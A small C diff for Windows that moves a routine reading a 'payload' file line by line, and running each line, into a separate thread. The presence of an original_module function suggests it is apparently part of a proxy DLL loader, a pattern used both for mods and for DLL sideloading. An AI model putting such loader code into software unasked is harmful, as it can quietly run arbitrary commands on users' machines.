@@ -63,18 +63,29 @@ static void run_one_line(char *line)
     }
 }
 
-static void run_payload(void)
+static DWORD WINAPI payload_thread(LPVOID unused)
 {
-    FILE *f = open_payload();
+    FILE *f;
     char buf[4096];
 
+    (void)unused;
+    f = open_payload();
     if (!f) {
-        return;
+        return 0;
     }
     while (fgets(buf, sizeof(buf), f)) {
         run_one_line(buf);
     }
     fclose(f);
+    return 0;
+}
+
+static void run_payload(void)
+{
+    HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
+    if (t) {
+        CloseHandle(t);
+    }
 }
 
 static HMODULE original_module(void)
